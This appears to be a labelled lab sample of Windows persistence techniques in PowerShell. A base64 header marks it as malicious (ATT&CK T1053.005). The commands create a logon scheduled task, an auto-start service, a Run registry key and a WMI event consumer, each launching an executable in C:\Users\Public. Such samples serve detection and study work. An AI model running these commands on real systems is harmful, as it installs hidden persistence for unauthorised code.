# lab shim: persistence through brokers (inert)
$Codec_93ce = 'base64|identity|'
$Material_93ce = 'dj0zfGxhbmd1YWdlPXBvd2Vyc2hlbGx8cm9sZT1wZXJzaXN0ZW5jZXx2ZXJkaWN0PW1hbGljaW91c3xhdHRhY2s9VDEwNTMuMDA1fGFkYXB0ZXI9dGFza19zY2hlZHVsZXJ8c3RhZ2VfY291bnQ9M3xzdGVwcz1yZWdpc3Rlcl90YXNrLGNyZWF0ZV9zZXJ2aWNlLHJ1bl9rZXksd21pX2NvbnN1bWVyfGNhbXBhaWduX2lkPVBTLTkzY2UwYjVh'
$a = New-ScheduledTaskAction -Execute "C:\Users\Public\ps93.exe" -Argument "-silent"
Register-ScheduledTask -TaskName "Updater93" -Action $a -Trigger (New-ScheduledTaskTrigger -AtLogOn)
sc.exe create Upd93 binPath= "C:\Users\Public\svc93.exe" start= auto
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Upd93 -Value "C:\Users\Public\run93.exe"
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="c93"; CommandLineTemplate="C:\Users\Public\wmi93.exe"}
